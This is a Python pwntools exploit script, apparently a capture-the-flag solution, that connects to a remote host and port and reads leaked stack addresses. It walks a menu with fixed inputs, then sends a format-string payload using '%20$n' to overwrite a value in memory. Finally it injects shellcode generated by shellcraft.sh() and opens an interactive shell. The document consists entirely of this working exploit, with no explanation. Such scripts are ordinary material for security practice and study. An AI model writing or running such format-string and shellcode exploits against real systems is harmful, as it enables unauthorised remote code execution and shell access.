from pwn import *

#sh = process('./pwn')
#sh = gdb.debug('./pwn')
sh = remote('111.200.241.244', 50183)
context.binary = './pwn'
e = ELF('./pwn')
#context.log_level = 'debug'

sh.recvuntil(b'] is ')
s = sh.recvuntil(b'\n')
v4_0_addr = int(s, 16)

sh.recvuntil(b'] is ')
v4_1_addr = int(sh.recvuntil(b'\n'), 16)

sh.sendline(b'east')

sh.recv()

sh.sendline(b'east')

sh.recv()

sh.sendline(b'1')

sh.recv()

sh.sendline(b'1234')

sh.recv()

#payload = p64(v4_0_addr) + b'a'*77 + b'%8$n' + b'%8$s'
payload = b'a'*85 + b'%20$n' + b'a'*6 + p64(v4_0_addr)

sh.sendline(payload)

print(sh.recv())

sh.sendline(asm(shellcraft.sh()))

sh.interactive()

